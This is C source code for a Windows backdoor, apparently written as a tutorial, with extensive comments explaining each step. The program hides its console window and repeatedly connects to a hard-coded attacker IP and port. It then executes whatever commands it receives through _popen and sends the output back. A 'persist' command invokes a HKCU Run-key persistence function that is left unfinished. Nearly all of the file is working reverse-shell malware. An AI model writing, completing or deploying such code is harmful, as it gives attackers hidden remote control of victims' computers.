// Loading necessary libaries for backdoor
#include <stdio.h> //Allows to do basic input output functions
#include <stdlib.h> //Allows to do basic general purpose functions like malloc
#include <unistd.h> //Allows to do UNIX OS functions like file operations and process control.
#include <string.h> //Allows string manipulation functions (text)
#include <sys/stat.h> //Allows working with file information and process control
#include <sys/types.h> //Allows working with file information and process control

//Loading windows libaries
#include <winsock2.h> //Allows program to communicate over networks.
#include <windows.h> //Windows API header, provide access to machine core functions
#include <winuser.h> //Allows to create user interface in windows applications.
#include <wininet.h> //Allow program to do internet options like downloading and uploading.
#include <windowsx.h> //Allows to do extra macro functions to make windows program easier.

#define bzero(p, size) (void) memset((p), 0, (size)) //Perfoam a same task like memset function does.
//bzero take parameter and the memory size as a input.
//define memset funtion for the following inputs.
//0 for overwrite the values by zero.


//Global Variable denotes here
int sock;

//Lets Code the bootrun function here..
int bootRun()
{
  //The function not take any arguments as input because it will execute true false situations. 
  //If success denoted by 0. neither nor return 1.
  //My Registry Key > Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run.


  //Make two variable to denote the error and success message of the bootRun Function.
  char err[128] = "Failed to Set\n";
  char suc[128] = "Created Persistance At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";


  
}


//The below function make slicing the command provided by the user as cd 'cut' directory.
//Slicing the string `cd `
//String manipulation allows us cut a string below.
char *
str_cut(char str[], int slice_from, int slice_to)
{
    if(str[0] == '\0')
    {
        return NULL;
    }

    char *buffer;
    size_t str_len, buffer_len;

    if(slice_to < 0 && slice_from > slice_to)
    {
        str_len = strlen(str);

        if(abs(slice_to) > str_len - 1)
        {
            return NULL;
        }

        if(abs(slice_from) > str_len)
        {
            slice_from = (-1) * str_len;
        }

        buffer_len = slice_to - slice_from;
        str += (str_len + slice_from);
    }
    else if(slice_from >= 0 && slice_to > slice_from)
    {
        str_len = strlen(str);

        if(slice_from > str_len - 1)
        {
            return NULL;
        }

        buffer_len = slice_to - slice_from;
        str += slice_from;
    }
    else
    {
        return NULL;
    }

    buffer = calloc(buffer_len, sizeof(char));
    strncpy(buffer, str, buffer_len);
    return buffer;
}

//Let's code shell void function that doesn't return any output it perfoam argument execution.
//this shell function is able to executable commands in the target.
void shell()
{

  //allocate variables.
    char buffer[1024]; // This variable used to receive the execution command from the server it consist of 1024 bytes of memory.
    //The container might be used to store a smaller portion of the output (e.g., part of the command's result), and then the data in container would be added to the total_response buffer, which accumulates the complete output from multiple read.
    char container[1024]; 
    char total_reponse[18384];


    //After creating variable jump into while true loop >> represent as "while (1)"
    while (1)
    {
      jump:
      //let's allocate the memory as zeros for all variables that we have declared.
      //the best practice to do calling sizeof function to particular variable that has been declared.
      bzero(buffer, 1024);//manually giving the size here.
      bzero(container, 1024);//same as above
      bzero(total_reponse, sizeof(total_reponse));//same operation as above.


      //Next our shell want to receive the command from the server let's perfoam.
      //recv functtion take 4 arguments lets explain
      //1st where we want to receive the command? > From Socket. that is the argument.
      //2nd  want to store the command that received from ther server > That is buffer variable.
      //3rd size of the buffer variable.
      //4th argument is 0, because not specify any argument beside the function.
      recv(sock, buffer, 1024, 0);


      //Compare the buffer with different commands.
      //if q represent quit the program implment it == strncmp compare string with it byte values.
      if (strncmp("q", buffer, 1) == 0)
      {
        closesocket(sock);//close socket
        WSACleanup();//clean socket object
        exit(0);//exit the program
      }
      //Want to add cd command to change the directory in target system.
      else if (strncmp("cd ", buffer, 3) == 0)
      {
        //chdir function change directory.
        //strcut function will cut the string into initiated values.
        chdir(str_cut(buffer, 3, 100));
      }
      //want to make the program persistence in the target machine.
      else if (strncmp("persist", buffer, 7) == 0)
      {
        //the bootRun function allows us to make persistance the backdoor when target rebooted.
        bootRun();
      }
      
      
      else 
      {
        //let's create a file descripter.
        FILE *fp;//It will point to the specific memory.
        //want to open file as a process.
        fp = _popen(buffer, "r"); // simply telling the program to execute the buffer by reading it > "r".
        //Now need to get the reponse from the computer. by reading the buffer.
        while(fgets(container, 1024, fp) != NULL)
        {
          //The process is want to read and execute buffer and storing the output in the container variable fits to 1024 bytes.
          //Some time the reponse is larger than 1024 bytes which will store to total reponse varible which 17 MB.
          //Concatinating same output of the container to total_response if output get larger.
          strcat(total_reponse, container);
        } 
        //Need to send the total response to the server.
        //0 is specify not indicating anything beside this.
        send(sock, total_reponse, sizeof(total_reponse), 0);

        //Once working with file descriptor want to close it.
        fclose(fp);

      }
      

    }
}


//Let's Start the main function
// This function is returning integer that why we specify int int the function.
//Reason to specify 'APIENTRY' Para is every windows program consist of an entry point.
//And it's also create API access to the main program.
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
    //'HINSTANCE' - Used to handle an instance or a module(Executable) that was loaded in the memory.
    //hPrev -  Used in 16-bit windows now it's always 0.
    //Cmdline - UNICODE string act as an argument in the program.
    //CmdShow - A flag to represent minimized or maximized in the function.


    //Let's Program to make program execution invisible to the target while execution.
    HWND stealth;
    AllocConsole();//Allocate new console to the calling process.
    //below funtion handle windows top level functions window it take 2 parameters. 1 is Class name and 2 is Windows name it should be null.
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    //Reason - that we we want to show a windows to target or not.
    //It take 2 arguments. 1 one handle windows that we specify earlier.
    // 2nd arg - is 0 - Hiding the current window and activate another window.
    ShowWindow(stealth, 0);

    
    //Let'Start to create a socket to begin the connection with the bacdoor.
    //Let's create a structure of server address.(Similar to Class)

    struct sockaddr_in ServAddr;
    //let's assign server port.
    unsigned short ServPort;
    char *ServIP; //which point the memory address of the particular variable.
    WSADATA wsaData;//WSADATA is structure which consist with the windows socket informations.

    ServIP = "10.0.3.150";//here must want to apply the attacker machine IP.
    ServPort = 4444; //Make sure another process is not using same port.


    //WSAStartup is initiate a process of winsock dll by a process.
    //if successful WSAStartup function will return 0 otherwise exit the program.

    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
    {
      //MAKEWORD requests winsock major and minor version (2 and 0)
      //&wsaData is a pointer to WSADATA structure which contain winsock implementation details.
        exit(1);
    }


    //define the socket object
    //must specify this variable function in out side of the main funtion. which can be able to access by other functions also.

    //AF_INET is used to establish the connection using IPV4.
    //SOCK_STREAM is used to establish TCP 3 way handshake with the target.
    //0 is we not decline anything after connection establishment.
    sock = socket(AF_INET, SOCK_STREAM, 0);

    //clear all struct variable in zeros using memset function.
    //memory location of the variable.
    //Make all the contents to zero to ServAddr.
    //Fill the memory occupied by the ServAddr structure with zeros, for the entire size of the structure.
    //which helps prevent potential issues caused by uninitialized data.
    memset(&ServAddr, 0, sizeof(ServAddr));

    //IPv4 Connection.
    ServAddr.sin_family = AF_INET;
    //Create the actual IP of our server by converting string to  IP format.
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    //define port by converting integer to port.
    ServAddr.sin_port = htons(ServPort);

    //Perfoam the connection.
    start: //Start here is a checkpoint to the connection
    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
    {
      //1st argument of connect funtion is socket.
      //2nd argument specify the structre of sockaddr pointer.
      //map the sockaddr strucure to Serveraddress memory location pointer.
      //and then try to connect our target each 10 seconds.
      //the target could run the payload before start executing the server.
      //if the is equal to 0 proceed to other code otherwise make a loop because want to create connection with the target.
      sleep(10); //Sleep 10 seconds for each iterations
      //if connection established skip it otherwise goto start checkpoint to perfoam connection.
      goto start;
    }

    //if connectione was successful start the shell function.
    //which will make the attacker commands executable in the target. 
    shell();



}
